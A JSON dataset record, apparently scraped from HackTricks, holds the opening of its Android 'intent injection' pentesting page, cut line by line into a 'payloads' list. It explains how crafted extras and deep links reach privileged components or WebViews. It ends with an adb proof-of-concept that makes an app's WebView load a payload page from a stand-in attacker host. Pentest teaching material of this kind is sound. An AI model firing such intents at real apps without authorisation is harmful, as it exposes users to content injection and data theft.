{
  "id": "mobile_pentesting_2dc70ca99a1e",
  "category": "mobile-pentesting",
  "title": "intent injection",
  "description": "# Intent Injection\n\n{{#include ../../banners/hacktricks-training.md}}\n\nIntent injection abuses components that accept attacker-controlled Intents or data that is later converted into Intents. Two very common patterns during Android app pentests are:\n\n- Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components.\n- Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews",
  "payloads": [
    "# Intent Injection",
    "{{#include ../../banners/hacktricks-training.md}}",
    "Intent injection abuses components that accept attacker-controlled Intents or data that is later converted into Intents. Two very common patterns during Android app pentests are:",
    "- Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components.",
    "- Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews or other sensitive sinks.",
    "## Deep links \u2192 WebView sink (URL parameter injection)",
    "If an app exposes a custom scheme deep link such as:",
    "```text",
    "myscheme://com.example.app/web?url=<attacker_url>",
    "and the receiving Activity forwards the `url` query parameter into a WebView, you can force the app to render arbitrary remote content in its own WebView context.",
    "PoC via adb:",
    "```bash",
    "# Implicit VIEW intent",
    "adb shell am start -a android.intent.action.VIEW \\",
    "-d \"myscheme://com.example.app/web?url=https://attacker.tld/payload.html\""
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/mobile-pentesting/android-app-pentesting/intent-injection.md"
  ]
}